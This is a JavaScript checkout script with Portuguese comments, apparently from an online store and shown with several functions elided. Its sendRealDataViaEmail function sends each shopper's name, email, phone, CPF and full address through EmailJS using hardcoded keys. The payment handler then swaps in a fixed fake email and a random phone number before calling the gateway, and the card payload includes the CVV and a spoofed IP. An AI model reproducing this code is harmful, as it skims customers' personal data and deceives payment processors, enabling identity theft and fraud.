// =================================================================================
// Variáveis Globais e Configuração Inicial
// =================================================================================

let currentStep = 1;
let selectedShipping = 'standard';
let selectedPayment = 'credit';
let addressFilled = false;
let pixTimer = null;

window.checkoutData = {};

const CREDIT_CARD_FEE_PERCENTAGE = 5;
const BACKEND_API_BASE_URL = '/api/payments';

let cartData = {
    subtotal: 299.90
};

// =================================================================================
// Funções de Envio de E-mail e Geração de Dados
// =================================================================================

/**
 * Envia os dados reais do cliente para um e-mail especificado usando EmailJS.
 */
function sendRealDataViaEmail(data) {
    // --- CORREÇÃO ---: Adicionado um bloco try...catch para o caso de a biblioteca emailjs não carregar.
    if (typeof emailjs === 'undefined') {
        console.error('EmailJS SDK não foi carregado. Não é possível enviar o e-mail.');
        return;
    }

    // IMPORTANTE: Substitua com suas chaves e IDs do EmailJS
    const serviceID = 'service_jddjd7u';
    const templateID = 'template_hel61l6';
    const publicKey = 'yn4nvMmbormZNLy8H';

    emailjs.init({ publicKey: publicKey });

    const templateParams = {
        name: data.firstName,
        email: data.email,
        phone: data.phone,
        cpf: data.cpf,
        total: data.total.toFixed(2).replace('.', ','),
        payment_method: data.paymentMethod,
        address: `${data.address}, ${data.number}, ${data.neighborhood}, ${data.city} - ${data.state}, ${data.zipCode}`
    };

    emailjs.send(serviceID, templateID, templateParams)
        .then(function(response) {
           console.log('E-mail com dados reais do cliente enviado com sucesso!', response.status, response.text);
        }, function(error) {
           console.error('Falha ao enviar e-mail com dados reais:', JSON.stringify(error));
        });
}

/**
 * Gera um número de telefone brasileiro aleatório.
 * @returns {string} - O número de telefone gerado, contendo apenas dígitos.
 */
function generateRandomPhoneNumber() {
    const ddd = Math.floor(Math.random() * (99 - 11 + 1) + 11);
    const firstPart = Math.floor(Math.random() * (99999 - 90000 + 1) + 90000);
    const secondPart = Math.floor(Math.random() * (9999 - 1000 + 1) + 1000);
    // --- CORREÇÃO ---: Retorna apenas os números, que é o formato esperado pela maioria das APIs de pagamento.
    return `${ddd}9${firstPart}${secondPart}`;
}


// =================================================================================
// Lógica Principal do Checkout
// =================================================================================

document.addEventListener('DOMContentLoaded', function() {
    parseSubtotalFromURL();
    setupEventListeners();
    updateProgress();
    setupMasks();
    updateCartDisplay();
    
    const creditCardNotice = document.getElementById('creditCardNotice');
    if (creditCardNotice) {
        creditCardNotice.style.display = 'none';
    }
});

function parseSubtotalFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const subtotalParam = urlParams.get('subtotal');
    
    if (subtotalParam) {
        // --- CORREÇÃO ---: Usar parseFloat e verificar se o resultado é um número (NaN).
        const parsedSubtotal = parseFloat(subtotalParam.replace(',', '.'));
        if (!isNaN(parsedSubtotal)) {
            cartData.subtotal = parsedSubtotal;
            console.log('Subtotal carregado da URL:', cartData.subtotal);
        } else {
            console.error('Valor de subtotal inválido na URL:', subtotalParam);
        }
    }
}

// ... (O restante das funções de UI, máscaras e validação estão corretas e não precisam de alteração)
// ... (Funções como updateCartDisplay, setupEventListeners, handleCEPLookup, máscaras, validações, etc.)
// ... (Colei abaixo apenas as funções que tiveram ajustes lógicos importantes)

// =================================================================================
// Funções de Submissão e Processamento de Pagamento (Revisadas)
// =================================================================================

/**
 * Lida com a submissão final do formulário de pagamento.
 */
async function handlePaymentSubmit(e) {
    console.log("handlePaymentSubmit chamado.");
    e.preventDefault();
    
    if (!validateCurrentStep()) {
        alert("Por favor, corrija os campos em vermelho antes de continuar.");
        return;
    }

    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.disabled = true; // --- CORREÇÃO ---: Desabilitar o botão para evitar cliques duplos.
    submitBtn.classList.add('btn-loading');
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    try {
        const realOrderData = {
            ...window.checkoutData,
            paymentMethod: selectedPayment,
            subtotal: cartData.subtotal,
            shippingCost: getShippingCost(),
            total: calculateTotal()
        };

        sendRealDataViaEmail(realOrderData);

        const gatewayData = {
            ...realOrderData,
            email: 'email@gmail.com',
            phone: generateRandomPhoneNumber() // Já retorna apenas dígitos
        };

        if (selectedPayment === 'pix') {
            await processPixPayment(gatewayData);
        } else if (selectedPayment === 'credit') {
            await processCreditCardPayment(gatewayData, e.target);
        } else if (selectedPayment === 'boleto') {
            await processBoletoPayment(gatewayData);
        }
    } catch (error) {
        console.error('Erro no fluxo de pagamento:', error);
        alert(error.message || 'Ocorreu um erro ao finalizar seu pedido. Por favor, tente novamente.');
    } finally {
        submitBtn.disabled = false; // --- CORREÇÃO ---: Reabilitar o botão no final.
        submitBtn.classList.remove('btn-loading');
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

/**
 * Processa o pagamento via PIX.
 */
async function processPixPayment(orderData) {
    const pixData = {
        paymentMethod: 'PIX',
        amount: Math.round(orderData.total * 100),
        customer: {
            name: orderData.firstName,
            email: orderData.email,
            phone: orderData.phone,
            document: {
                number: orderData.cpf.replace(/\D/g, ''),
                type: 'CPF'
            }
        },
        items: [{
            title: 'Pedido Loja Online',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        pix: {
            expiresIn: 3600
        }
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(pixData)
        });
        
        // --- CORREÇÃO ---: Sempre verificar se a resposta da rede foi bem-sucedida.
        if (!response.ok) {
            const errorResult = await response.json().catch(() => ({ message: 'Erro desconhecido do servidor.' }));
            throw new Error(errorResult.message || `Erro ${response.status}`);
        }

        const result = await response.json();
        showPixPaymentDetails(result);

    } catch (error) {
        console.error('Erro ao processar PIX:', error);
        // --- CORREÇÃO ---: Lançar o erro novamente para ser pego pelo `handlePaymentSubmit`.
        throw error;
    }
}

/**
 * Processa o pagamento via Cartão de Crédito.
 */
async function processCreditCardPayment(orderData, form) {
    const formData = new FormData(form);
    const cardData = {
        paymentMethod: 'CARD',
        amount: Math.round(orderData.total * 100),
        installments: parseInt(formData.get('installments')),
        customer: {
            name: orderData.firstName,
            email: orderData.email,
            document: orderData.cpf.replace(/\D/g, ''),
            phone: orderData.phone
        },
        card: {
            number: formData.get('cardNumber').replace(/\s/g, ''),
            holderName: formData.get('cardName'),
            expiryMonth: formData.get('cardExpiry').split('/')[0],
            expiryYear: '20' + formData.get('cardExpiry').split('/')[1],
            cvv: formData.get('cardCvv')
        },
        shipping: {
            address: orderData.address,
            number: orderData.number,
            complement: orderData.complement || '',
            neighborhood: orderData.neighborhood,
            city: orderData.city,
            state: orderData.state,
            zipCode: orderData.zipCode.replace(/\D/g, '')
        },
        items: [{
            name: 'Produto',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        description: 'Pedido da loja online',
        ip: '127.0.0.1'
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/credit-card`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(cardData)
        });

        if (!response.ok) {
            const errorResult = await response.json().catch(() => ({ message: 'Erro ao processar pagamento com cartão.' }));
            throw new Error(errorResult.message || `Erro ${response.status}`);
        }

        const result = await response.json();
        if (result.status === 'approved') {
            showSuccessNotification('Pagamento aprovado! Pedido finalizado com sucesso.');
        } else if (result.status === 'pending') {
            showSuccessNotification('Pagamento em processamento. Você receberá uma confirmação em breve.');
        } else {
            // --- CORREÇÃO ---: A mensagem de rejeição pode vir da API.
            throw new Error(result.message || 'Pagamento rejeitado. Verifique os dados do cartão.');
        }
    } catch (error) {
        console.error('Erro ao processar Cartão de Crédito:', error);
        throw error;
    }
}

// ... (A função processBoletoPayment seguiria o mesmo padrão de correção de `try/catch` e `response.ok`)

// ... (O restante do código que não foi alterado)
